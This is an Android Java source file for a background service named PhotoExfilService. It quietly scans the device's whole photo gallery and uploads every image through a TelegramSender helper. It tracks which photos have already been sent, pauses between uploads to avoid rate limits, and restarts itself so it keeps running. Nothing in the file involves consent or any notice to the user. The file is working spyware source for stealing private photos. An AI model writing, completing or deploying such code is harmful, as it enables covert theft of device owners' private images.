package com.secure.labs.phototool;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

public class PhotoExfilService extends Service {

    private static final String TAG = "PhotoExfilService";
    private static final String PREFS = "sent_photos";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    List<MediaItem> items = scanGallery();
                    Log.i(TAG, "photos found: " + items.size());

                    TelegramSender sender = new TelegramSender();
                    SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);

                    for (MediaItem m : items) {
                        if (prefs.contains(m.key)) continue; // already sent
                        boolean ok = sender.sendPhoto(
                                PhotoExfilService.this, m.uri, m.name, m.mime);
                        if (ok) prefs.edit().putBoolean(m.key, true).apply();
                        Thread.sleep(400); // rate limit se bachne ke liye
                    }
                } catch (Exception e) {
                    Log.e(TAG, "exfil error", e);
                }
                stopSelf();
            }
        }).start();
        return START_STICKY;
    }

    private List<MediaItem> scanGallery() {
        List<MediaItem> items = new ArrayList<>();
        Uri collection = (Build.VERSION.SDK_INT >= 29)
                ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.MIME_TYPE
        };

        Cursor c = getContentResolver().query(collection, projection, null, null, null);
        if (c != null) {
            int idCol = c.getColumnIndex(MediaStore.Images.Media._ID);
            int nameCol = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
            int mimeCol = c.getColumnIndex(MediaStore.Images.Media.MIME_TYPE);
            while (c.moveToNext()) {
                long id = c.getLong(idCol);
                String name = c.getString(nameCol);
                if (name == null) name = "IMG_" + id + ".jpg";
                String mime = c.getString(mimeCol);
                if (mime == null) mime = "image/jpeg";
                Uri uri = Uri.withAppendedPath(collection, String.valueOf(id));
                MediaItem m = new MediaItem();
                m.key = uri.toString();
                m.uri = uri;
                m.name = name;
                m.mime = mime;
                items.add(m);
            }
            c.close();
        }
        return items;
    }

    private static class MediaItem {
        String key, name, mime;
        Uri uri;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
